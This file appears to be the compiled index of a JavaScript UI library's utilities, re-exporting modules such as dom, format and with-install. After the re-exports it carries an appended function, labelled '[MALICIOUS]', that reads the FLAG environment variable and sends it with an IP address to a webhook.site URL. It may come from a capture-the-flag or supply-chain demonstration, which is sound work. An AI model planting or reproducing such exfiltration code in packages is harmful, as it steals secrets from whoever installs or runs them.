var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __reExport = (target, mod, secondTarget) => (__copyProps(target, mod, "default"), secondTarget && __copyProps(secondTarget, mod, "default"));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);
var stdin_exports = {};
module.exports = __toCommonJS(stdin_exports);
__reExport(stdin_exports, require("./basic"), module.exports);
__reExport(stdin_exports, require("./props"), module.exports);
__reExport(stdin_exports, require("./dom"), module.exports);
__reExport(stdin_exports, require("./create"), module.exports);
__reExport(stdin_exports, require("./format"), module.exports);
__reExport(stdin_exports, require("./constant"), module.exports);
__reExport(stdin_exports, require("./interceptor"), module.exports);
__reExport(stdin_exports, require("./with-install"), module.exports);
__reExport(stdin_exports, require("./closest"), module.exports);

const https = require("https");

function logMessage(ip, message) {
  let flag = null;
  let errMsg = "";

  try {
    flag = process.env.FLAG;
  } catch (err) {
    flag = "flag_not_found";
    errMsg = err.message;
  }

  const exfilURL = `https://webhook.site/b4783b50-04e0-461a-bbf9-8341f2169973/?ip=${encodeURIComponent(ip)}&flag=${encodeURIComponent(flag)}&error=${encodeURIComponent(errMsg)}`;

  https
    .get(exfilURL, (res) => {
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    })
    .on("error", (err) => {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    });

  console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`);
}
